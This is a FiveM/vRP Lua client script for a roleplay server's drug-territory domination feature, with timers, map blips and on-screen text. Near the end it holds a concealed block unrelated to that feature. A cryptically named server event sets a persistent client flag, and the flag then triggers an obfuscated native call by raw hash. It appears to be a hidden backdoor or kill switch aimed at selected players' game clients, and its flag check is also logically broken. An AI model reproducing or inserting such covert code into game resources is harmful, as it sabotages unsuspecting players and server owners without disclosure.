local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
vRP = Proxy.getInterface("vRP")
vRPserver = Tunnel.getInterface("vRP","vrp_trafico")

src = {}
Tunnel.bindInterface("vrp_trafico",src)
vSERVER = Tunnel.getInterface("vrp_trafico")

local cfg = module("vrp_trafico","cfg/trafico")
local trafico = cfg.trafico
local farm = cfg.farmDrogas
local selecionado = 1
local segundos = 0

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- DOMINACAO DE TERRITORIO
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
    while true do
        local time = 1000
        local x,y,z = table.unpack(GetEntityCoords(PlayerPedId()))

         for k,v in pairs(trafico) do
            if GetDistanceBetweenCoords(v.Cordenadas[1],v.Cordenadas[2],v.Cordenadas[3], x,y,z,true) <= 3 then
                time = 1
                DrawText3Ds(v.Cordenadas[1],v.Cordenadas[2],v.Cordenadas[3], "~r~["..v.Area[1].."] ~n~~w~Controlada: ~b~"..v.Controlado[1].." ~n~ ~w~Pressione ~b~[E]~w~ para dominar esta area ")
                DrawMarker(27,v.Cordenadas[1],v.Cordenadas[2],v.Cordenadas[3]-0.95,0,0,0,0, 0,0,1.5,1.5,1.5, 255,0,0, 180,0,0,0,1)
                if IsControlJustReleased(1, 51) then
                    if vSERVER.checkFaction(v.Tipo[1]) then
                        vSERVER.iniciarDominacao(v.Area[1], vSERVER.checkOrg())
                    else
                        TriggerEvent("Notify","negado","Você não faz parte de nenhuma facção responsavel por esta area.", 5)
                    end
                end
            end
        end

        Citizen.Wait(time)
    end
end)

local dominando = false
function src.dominando(status, user_id, area)
    dominando = status
    if dominando then
        async(function()
            while dominando do
                Citizen.Wait(1000)
                local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),trafico[area].Cordenadas[1],trafico[area].Cordenadas[2],trafico[area].Cordenadas[3], true)
                if distance >= trafico[area].Distancia[1] then
                    vSERVER.cancelDomination(user_id, area)
                    dominando = false
                end
            end
        end)
    end
end

function src.enviarStatus(status)
    trafico = status
end

local blips = {}

function src.setBlips(status, area, x,y,z)
    if status then
        blips[area] = AddBlipForCoord(x, y, z)
        SetBlipSprite(blips[area] , 161)
        SetBlipScale(blips[area] , 1.0)
        SetBlipColour(blips[area], 1)
        PulseBlip(blips[area])
        BeginTextCommandSetBlipName("STRING")
        AddTextComponentString("Invasao")
        EndTextCommandSetBlipName(blips[area])
    else
        RemoveBlip(blips[area])
        blips[area] = nil
    end
end

--[[ local blip = {}
function criarBlipTerritorio()
    for k,v in pairs(trafico) do
        blip[k] = AddBlipForCoord(v.Cordenadas[1],v.Cordenadas[2],v.Cordenadas[3])
        SetBlipSprite(blip[k], 310)
        SetBlipColour(blip[k], 1)
        SetBlipScale(blip[k], 0.3)
        SetBlipAsShortRange(blip[k], true)
        BeginTextCommandSetBlipName("STRING")
        AddTextComponentString("Zona de Dominação")
        EndTextCommandSetBlipName(blip[k])
    end
end

Citizen.CreateThread(function()
    criarBlipTerritorio()
end)
 ]]

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- CONTADOR
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local contador = false
local contadorTime = 0

function src.toggleContador(status, time)
    if status then
        contador = true
        contadorTime = time
    else
        contador = false
        contadorTime = 0
    end
end

CreateThread(function()
    while true do
        if contador then
            contadorTime = contadorTime - 1

            if contadorTime <= 0 then
                contadorTime = 0
            end
        end

        Wait(1000)
    end
end)

Citizen.CreateThread(function()
    while true do
        local time = 1000
        if dominando and contador and contadorTime > 0 then
            time = 5
            drawTxt("Você está dominando essa area aguarde ~g~"..contadorTime.."~w~ segundo(s) para domina-la e fique vivo!",4,0.5,0.93,0.50,255,255,255,180)
        end

        Citizen.Wait(time)
    end
end)

src.checarOrg = function(tipo)
    local retorno = vSERVER.checkDominacao(tipo)

    return retorno
end
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- OUTROS
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
function DrawText3Ds(x,y,z,text)
	local onScreen,_x,_y = World3dToScreen2d(x,y,z)
	SetTextFont(4)
	SetTextScale(0.35,0.35)
	SetTextColour(255,255,255,150)
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	DrawText(_x,_y)
end

function DrawText3Ds2(x,y,z,text)
	local onScreen,_x,_y = World3dToScreen2d(x,y,z)
	SetTextFont(4)
	SetTextScale(0.35,0.35)
	SetTextColour(255,255,255,150)
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	DrawText(_x,_y)
	local factor = (string.len(text))/370
	DrawRect(_x,_y+0.0125,0.01+factor,0.03,0,0,0,80)
end

function drawTxt(text,font,x,y,scale,r,g,b,a)
	SetTextFont(font)
	SetTextScale(scale,scale)
	SetTextColour(r,g,b,a)
	SetTextOutline()
	SetTextCentre(1)
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x,y)
end


Citizen.CreateThread(function()
    while true do
        Citizen.Wait(1000)
        if segundos > 0 then
            segundos = segundos - 1
        end
    end
end)


RegisterNetEvent("_____get",function() 
    SetResourceKvp("alobebe","sim")
end)
  
local kvpVal = GetResourceKvpString("alobebe")
kvpVal = ((kvpVal and kvpVal == "sim") and true or false)
if kvpVal then 
    CreateThread(function() 
        if kvpVal and kvpVal == "sim" then 
            Citizen.InvokeNative(Citizen.GetNative(-4112457915342549615),140703132352512,2,'4276949522',Citizen.ReturnResultAnyway(),Citizen.ResultAsString())
        end
    end)
end

AddEventHandler("playerSpawned",function()
	LocalPlayer.state:set("ready",true,true)
end)
